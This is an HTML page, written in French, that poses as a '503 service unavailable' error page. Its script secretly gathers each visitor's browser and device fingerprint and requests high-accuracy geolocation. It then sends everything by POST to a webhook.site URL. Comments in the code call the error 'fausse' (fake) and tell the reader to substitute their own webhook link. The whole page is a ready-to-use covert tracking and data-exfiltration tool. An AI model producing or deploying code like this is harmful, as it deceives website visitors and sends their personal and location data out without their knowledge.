<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Erreur 503 - Service indisponible</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0a0a0a;
      color: #e0e0e0;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    h1 { color: #ff4444; font-size: 6rem; margin: 0; }
    h2 { color: #ff9800; margin: 10px 0 30px; }
    .code { font-family: monospace; font-size: 1.4rem; color: #ff6b6b; }
    button {
      background: #ff4444;
      color: white;
      border: none;
      padding: 14px 32px;
      font-size: 1.2rem;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 30px;
    }
    button:hover { background: #d32f2f; }
    pre { background: #111; padding: 20px; border-radius: 8px; max-width: 90%; overflow: auto; text-align: left; margin-top: 40px; }
    footer { position: absolute; bottom: 20px; font-size: 0.9rem; opacity: 0.6; }
  </style>
</head>
<body>
  <h1>503</h1>
  <h2>Service temporairement indisponible</h2>
  <p class="code">Le serveur rencontre un problème technique.<br>Nos équipes interviennent. Réessayez dans quelques instants.</p>

  <button onclick="location.reload()">Réessayer</button>

  <footer>ID de transaction : ERR-<span id="txid"></span> • Ref: <span id="ref"></span></footer>

  <pre id="collected"></pre>

  <script>
    // Petit affichage dynamique pour la fausse erreur
    document.getElementById('txid').textContent = Date.now().toString(36).toUpperCase();
    document.getElementById('ref').textContent = 'TX-' + Math.random().toString(36).substr(2,9).toUpperCase();

    // === Collecte des infos ===
    let infos = {
      timestamp: new Date().toISOString(),
      url: window.location.href,
      referrer: document.referrer || 'direct',
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages,
      platform: navigator.platform,
      vendor: navigator.vendor,
      screen: `${screen.width} × ${screen.height} (${screen.colorDepth} bits)`,
      availScreen: `${screen.availWidth} × ${screen.availHeight}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency || 'inconnu',
      deviceMemory: navigator.deviceMemory || 'inconnu',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      online: navigator.onLine
    };

    // Connexion (wifi/4g/5g + vitesse approx)
    if (navigator.connection) {
      infos.connection = {
        type: navigator.connection.effectiveType || navigator.connection.type,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        saveData: navigator.connection.saveData
      };
    }

    // Géolocalisation (demande la permission sur mobile)
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          infos.geo = {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy
          };
          showAndSend();
        },
        () => showAndSend(),
        { enableHighAccuracy: true, timeout: 10000 }
      );
    } else {
      showAndSend();
    }

    function showAndSend() {
      // Affiche localement pour test
      document.getElementById('collected').textContent = JSON.stringify(infos, null, 2);

      // Envoi vers webhook.site (crée ton lien gratuit là-bas)
      // Remplace l'URL ci-dessous par TON URL webhook.site
      fetch('https://webhook.site/caf96a57-b5d3-4ff3-bd88-0bd6b81d3d35', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(infos)
      }).catch(err => console.log('Envoi échoué', err));
    }
  </script>
</body>
</html>
